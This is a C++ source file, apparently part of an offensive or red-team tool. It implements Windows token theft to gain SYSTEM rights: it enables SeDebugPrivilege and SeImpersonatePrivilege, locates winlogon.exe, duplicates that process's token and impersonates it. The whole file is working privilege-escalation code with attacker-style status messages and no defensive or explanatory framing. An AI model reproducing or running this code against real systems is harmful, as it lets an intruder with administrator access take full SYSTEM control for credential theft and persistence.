#include "stuff.h"
DWORD GetWinlogonPid() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0)
			{
				return entry.th32ProcessID;
			}
		}
	}
	return 0;
}

bool EnablePrivilege(PCWSTR privName, bool enable) {
	HANDLE hToken;
	if (!::OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
		return false;
	bool result = false;
	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;
	if (::LookupPrivilegeValue(nullptr, privName, &tp.Privileges[0].Luid)) {
		if (::AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)) result = ::GetLastError() == ERROR_SUCCESS;
	}
	::CloseHandle(hToken);
	return result;
}

DWORD ImpersonateSystem() {
	if (!EnablePrivilege(SE_DEBUG_NAME, TRUE)) {
#ifdef DEBUG
		std::wcout << "[!] Error enabling SeDebugPrivilege" << std::endl;
#endif
		return 1;
	}
	else {
#ifdef DEBUG
		std::wcout << "[+] SeDebugPrivilege Enabled" << std::endl;
#endif	
	}

	if (!EnablePrivilege(SE_IMPERSONATE_NAME, TRUE)) {
#ifdef DEBUG		
		std::wcout << "[!] Error enabling SeImpersonatePrivilege" << std::endl;
#endif		
		return 1;
	}
	else {
#ifdef DEBUG
		std::wcout << "[+] SeImpersonatePrivilege Enabled" << std::endl;
#endif	
	}

	DWORD systemPID = GetWinlogonPid();
	if (systemPID == 0) {
#ifdef DEBUG
		std::wcout << "[!] Error getting PID to Winlogon process" << std::endl;
#endif	
		return 1;
	}

	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, systemPID);
	DWORD dw = 0;
	dw = ::GetLastError();
	if (dw != 0) {
#ifdef DEBUG
		std::wcout << L"[-] OpenProcess failed: " << dw << std::endl;
#endif	
		return 1;
	}

	HANDLE hSystemTokenHandle;
	OpenProcessToken(procHandle, TOKEN_DUPLICATE, &hSystemTokenHandle);
	dw = ::GetLastError();
	if (dw != 0) {
#ifdef DEBUG
		std::wcout << L"[-] OpenProcessToken failed: " << dw << std::endl;
#endif		
		return 1;
	}

	HANDLE newTokenHandle;
	DuplicateTokenEx(hSystemTokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &newTokenHandle);
	dw = ::GetLastError();
	if (dw != 0) {
#ifdef DEBUG
		std::wcout << L"[-] DuplicateTokenEx failed: " << dw << std::endl;
#endif
		return 1;
	}

	ImpersonateLoggedOnUser(newTokenHandle);
	return 0;
}